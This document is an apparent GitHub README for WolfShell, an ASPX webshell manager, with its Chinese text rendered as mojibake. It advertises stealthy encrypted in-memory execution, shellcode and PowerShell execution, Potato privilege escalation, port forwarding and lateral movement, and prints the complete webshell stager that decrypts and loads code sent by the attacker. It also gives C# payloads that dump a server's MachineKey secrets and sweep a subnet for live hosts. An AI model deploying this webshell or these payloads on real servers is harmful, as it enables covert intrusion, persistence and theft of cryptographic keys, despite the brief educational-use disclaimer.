
# WolfShellï¼šä¸“ä¸ºASPXè®¾è®¡çš„é«˜çº§WebShellç®¡ç†å·¥å…·

WolfShell æ˜¯ä¸€æ¬¾ä¸“ä¸º ASPX ç¯å¢ƒè®¾è®¡çš„é«˜çº§ WebShell ç®¡ç†å·¥å…·ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜å’Œæ¸—é€æµ‹è¯•äººå‘˜æä¾›å¼ºå¤§çš„å‘½ä»¤æ‰§è¡Œã€æƒé™æå‡å’Œå†…ç½‘ç©¿é€èƒ½åŠ›ã€‚

## ğŸš€ æ ¸å¿ƒä¼˜åŠ¿

*   é«˜æ•ˆéšè”½çš„é€šä¿¡ï¼š é‡‡ç”¨ äºŒè¿›åˆ¶æµ ä¼ è¾“åè®®ï¼Œç¡®ä¿é€šä¿¡çš„é«˜æ•ˆæ€§ä¸éšè”½æ€§ã€‚
*   ç«¯åˆ°ç«¯å®‰å…¨åŠ å¯†ï¼š æ‰€æœ‰ä¼ è¾“ Payload å‡ç»è¿‡ AESåŠ å¯† ä¿æŠ¤ï¼Œä¸”æ¯æ¬¡é€šä¿¡ä½¿ç”¨ éšæœºå¯†é’¥ï¼Œä¿éšœæ•°æ®å®‰å…¨ã€‚
*   æ— ç—•è¿è¡Œï¼š æ”¯æŒç›´æ¥åœ¨ å†…å­˜ä¸­åŠ è½½å¹¶æ‰§è¡Œä»£ç ï¼Œæœ€å¤§ç¨‹åº¦é¿å…åœ¨ç£ç›˜ç•™ä¸‹ç—•è¿¹ï¼Œæ˜¾è‘—æå‡æ“ä½œéšè”½æ€§å’Œå®‰å…¨æ€§ã€‚
*   å†…ç½‘çº§è”WebShellæ§åˆ¶ï¼š é€šè¿‡ç°æœ‰å·²æ§çš„WebShellï¼Œæ— éœ€éƒ¨ç½²ä»£ç†æˆ–é…ç½®ç«¯å£è½¬å‘ï¼Œå³å¯ç›´æ¥è¿æ¥å¹¶æ§åˆ¶å¤„äºæ›´æ·±å±‚å†…ç½‘ç¯å¢ƒä¸­çš„WebShellèŠ‚ç‚¹ï¼Œå®ç°ä¾¿æ·é«˜æ•ˆçš„å†…ç½‘æ¨ªå‘ç©¿é€ã€‚

## ğŸ”¥ åŠŸèƒ½ç‰¹æ€§

*   Cmdå‘½ä»¤æ‰§è¡Œï¼š åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šç›´æ¥æ‰§è¡Œä»»æ„ CMD å‘½ä»¤ã€‚
*   PowerShellå‘½ä»¤æ‰§è¡Œï¼š æ”¯æŒæ‰§è¡Œ PowerShell è„šæœ¬å’Œå‘½ä»¤ã€‚
*   Shellcodeæ‰§è¡Œï¼š å¯åœ¨ç›®æ ‡ç¯å¢ƒå†…ç›´æ¥æ‰§è¡ŒåŸç”Ÿçš„ Shellcodeã€‚
*   C#ä»£ç æ‰§è¡Œï¼š æ”¯æŒåœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½ä¸æ‰§è¡Œ C# ä»£ç ã€‚
*   ç«¯å£è½¬å‘ï¼š å®ç°æœ¬åœ°ç«¯å£åˆ°è¿œç¨‹å†…ç½‘ä¸»æœºçš„æ˜ å°„ï¼Œæ–¹ä¾¿å®‰å…¨åœ°è®¿é—®å†…éƒ¨ç½‘ç»œæœåŠ¡ã€‚
*   Potatoææƒï¼š åˆ©ç”¨ç³»ç»ŸæœåŠ¡æ¼æ´è¿›è¡Œæƒé™æå‡ï¼Œæ”¯æŒä¸¤ç§ææƒæ¨¡å—ï¼š
*   efspotatoï¼š åˆ©ç”¨ EFSPotato å®ç°æƒé™æå‡ã€‚
*   badpotatoï¼š åˆ©ç”¨ BadPotato å®ç°æƒé™æå‡ã€‚
*   å†…ç½‘çº§è”Cmdå‘½ä»¤æ‰§è¡Œï¼š æ”¯æŒåœ¨å¤æ‚çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œçº§è”å†…ç½‘webshellæ‰§è¡Œ CMD å‘½ä»¤è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚
*   å†…ç½‘çº§è”PowerShellæ‰§è¡Œï¼š æ”¯æŒåœ¨å¤æ‚çš„å†…ç½‘ç¯å¢ƒä¸­ï¼Œçº§è”å†…ç½‘webshellæ‰§è¡Œ PowerShell å‘½ä»¤è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚


## å®‰è£…ä¸ä½¿ç”¨

1. **ä¸‹è½½WolfShell**
   - https://github.com/0x7556/wolfshell/releases

2. **é…ç½®ç¯å¢ƒ**
   - ç¡®ä¿ç›®æ ‡ç¯å¢ƒæ”¯æŒASPXï¼Œå¹¶å·²æ­£ç¡®é…ç½®ã€‚

3. **ä¸Šä¼ WolfShell**
   - å°†WolfShellæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ASPXæœåŠ¡å™¨ã€‚
   
```csharp
<%@ Page Language="C#" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes(Request.Cookies[0].Value); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); }%>
```
4. **è®¿é—®WebShell**
   - é€šè¿‡å·¥å…·å®¢æˆ·ç«¯è¿æ¥WebShellï¼Œå¼€å§‹ä½¿ç”¨ã€‚

![keep](http://www.18k.icu/img/wolfshell/WolfShell.png)


## ç¤ºä¾‹

### Cmdå‘½ä»¤æ‰§è¡Œ

![CmdShellç¤ºä¾‹](http://www.18k.icu/img/wolfshell/CmdShell.png)

### PowerShellå‘½ä»¤æ‰§è¡Œ

![PowerShellç¤ºä¾‹](http://www.18k.icu/img/wolfshell/PowerShell.png)

### C#ä»£ç æ‰§è¡Œ

#### è·å– ValidationKey ç¤ºä¾‹ä»£ç 

```csharp

using System;
using System.Reflection;
using System.Web.Configuration;
public class Eval
{
public string eval(Object obj)
{
var sy = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
var gac = mkt.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cg = (MachineKeySection)gac.Invoke(null, new object[0]);
return "ValidationKey: " + cg.ValidationKey + " | " + "Validation: " + cg.Validation + " | " + "DecryptionKey: " + cg.DecryptionKey + " | " + "Decryption: " + cg.Decryption + " | " + "CompatibilityMode: " + cg.CompatibilityMode;
}
}

```

![C#ä»£ç ç¤ºä¾‹](http://www.18k.icu/img/wolfshell/SharpCode2.png)

#### æ‰«æCæ®µå­˜æ´»ä¸»æœº ç¤ºä¾‹ä»£ç 
```csharp

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
public class Eval
{
public string eval(Object obj)
{
StringBuilder iplist = new StringBuilder();
string baseIP = "192.168.1.";
PingOptions options = new PingOptions();
options.DontFragment = true;
var tasks = new Task[254];
for (int i = 1; i < 255; i++)
{
int ipSuffix = i;
tasks[i - 1] = Task.Run(() =>
{
using (Ping myPing = new Ping())
{
PingReply reply = myPing.Send(baseIP + ipSuffix, 120);
if (reply.Status == IPStatus.Success)
{
lock (iplist)
{
iplist.AppendLine("Alive IP: " + reply.Address.ToString());
}
}
}
});
}
Task.WaitAll(tasks);
return iplist.ToString();
}
}


```


![C#ä»£ç ç¤ºä¾‹](http://www.18k.icu/img/wolfshell/SharpCode.png)

### Potatoææƒç¤ºä¾‹

#### efspotato

![EfsPotatoç¤ºä¾‹](http://www.18k.icu/img/wolfshell/EfsPotato.png)

#### badpotato


![BadPotatoç¤ºä¾‹](http://www.18k.icu/img/wolfshell/BadPotato.png)

### å†…ç½‘æ‰«æç¤ºä¾‹

![NetScanç¤ºä¾‹](http://www.18k.icu/img/wolfshell/NetScan.png)

### ç«¯å£è½¬å‘ç¤ºä¾‹

![ç«¯å£è½¬å‘ç¤ºä¾‹](http://www.18k.icu/img/wolfshell/PortTran.png)


## å…è´£å£°æ˜

- ä½¿ç”¨WolfShellæ—¶ï¼Œè¯·éµå¾ªç›¸å…³æ³•å¾‹æ³•è§„ï¼Œç¡®ä¿åœ¨æˆæƒçš„ç¯å¢ƒä¸­è¿›è¡Œæµ‹è¯•å’Œä½¿ç”¨ã€‚
- æœ¬å·¥å…·ä»…ä¾›æ•™è‚²å’Œç ”ç©¶ç›®çš„ï¼Œä»»ä½•æ»¥ç”¨è¡Œä¸ºå°†ç”±ç”¨æˆ·è‡ªè¡Œæ‰¿æ‹…åæœã€‚

## è´¡çŒ®

æ¬¢è¿ä»»ä½•å½¢å¼çš„è´¡çŒ®ï¼è¯·æäº¤é—®é¢˜ã€å»ºè®®æˆ–æ‹‰å–è¯·æ±‚ã€‚

## è®¸å¯è¯

æœ¬é¡¹ç›®é‡‡ç”¨MITè®¸å¯è¯ï¼Œè¯¦ç»†ä¿¡æ¯è¯·å‚è§[LICENSE](LICENSE)æ–‡ä»¶ã€‚

